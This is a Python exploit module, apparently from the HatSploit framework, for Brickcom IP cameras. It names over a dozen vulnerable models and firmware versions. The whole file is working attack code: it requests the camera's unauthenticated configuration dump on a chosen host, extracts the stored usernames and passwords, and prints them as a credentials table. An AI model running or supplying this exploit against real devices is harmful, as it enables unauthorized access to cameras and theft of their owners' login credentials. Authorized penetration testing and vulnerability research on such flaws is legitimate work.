#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.module import Module
from utils.http.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    details = {
        'Name': "Brickcom Multi Credentials Disclosure",
        'Module': "exploit/unix/brickcom/multi_credentials_disclosure",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Brickcom multiple devices credentials disclosure.",
        'Comments': [
            'Device Brickcom FB-100Ae IP Box Camera - Firmware Version: v3.0.6.12 (release:09/08/2010 14:46) is vulnerable.',
            'Device Brickcom WCB-100Ap Wireless Camera - Firmware Version: v3.0.6.26 (release:01/21/2011 18:31) is vulnerable.',
            'Device Brickcom VD-202Ne Vandal Dome Camera - Firmware Version: v37019_Promise (release:2015-10-01_18:46:07) is vulnerable.',
            'Device Brickcom VD-300Np Vandal Dome Camera - Firmware Version: v3.7.0.23T (release:2016-03-21_10:08:24) is vulnerable.',
            'Device Brickcom VD-E200Nf Vandal Dome Camera - Firmware Version: v3.7.0.5T (release:2015-06-25_11:18:07) is vulnerable.',
            'Device Brickcom OB-202Ne Bullet Camera - Firmware Version: v3.7.0.18R (release:2015-09-08_18:40:11) is vulnerable.',
            'Device Brickcom OB-E200Nf Bullet Camera - Firmware Version: v3.7.0.18.3R (release:2015-10-16_11:36:46) is vulnerable.',
            'Device Brickcom OB-200Np-LR Bullet Camera - Firmware Version: v3.7.0.18.3R (release:2015-10-15_11:30:46) is vulnerable.',
            'Device Brickcom OB-500Ap Bullet Camera - Firmware Version: v3.7.0.1cR (release:2016-01-18_10:07:03) is vulnerable.',
            'Device Brickcom GOB-300Np Bullet Camera (Unique Series) - Firmware Version: v3.7.0.17A (release: 2015-07-10_11:36:41) is vulnerable.',
            'Device Brickcom OB-200Np-LR Bullet Camera (Unique Series) - Firmware Version: v3.7.0.18.3R (release: 2015-10-15_11:30:46) is vulnerable.',
            'Device Brickcom MD-300Np Mini Dome Camera - Firmware Version: v3.2.2.8 (release:2013-08-01) is vulnerable.',
            'Device Brickcom CB-102Ae V2 Cube Camera - Firmware Version: v3.0.6.12 (release: 09/07/2010 11:45) is vulnerable.',
            'Device Brickcom FD-202Ne Fixed Dome Camera - Firmware Version:v3.7.0.17R (release: 2015-08-19_18:47:31) is vulnerable.',
        ],
        'Platform': "unix",
        'Risk': "high"
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True
        }
    }

    def exploit(self, remote_host, remote_port):
        self.output_process("Generating payload...")
        payload = '/configfile.dump?action=get'

        self.output_process("Sending payload...")
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path=payload
        )

        if not response or response.status_code != 200:
            self.output_process("Failed to send payload!")
            return

        creds = list()
        usernames = list()
        passwords = list()

        try:
            for config in response.text.split('\n'):
                variable = config.split('=')[0]
                if len(config.split('=')) >= 2:
                    value = config.split('=')[1]
                if 'UserSetSetting.userList.users' in variable:
                    if 'password' in variable:
                        if value:
                            passwords.append(value)
                    elif 'username' in variable:
                        if value:
                            usernames.append(value)

            count = len(usernames)
            for index in range(count):
                creds.append((usernames[index], passwords[index]))

            if creds:
                self.print_table("Credentials", ('Username', 'Password'), *creds)
            else:
                self.output_warning("Target vulnerable, but no credentials found.")
        except Exception:
            self.output_warning("Target vulnerable, but no credentials found.")

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.output_process(f"Exploiting {remote_host}...")
        self.exploit(remote_host, remote_port)
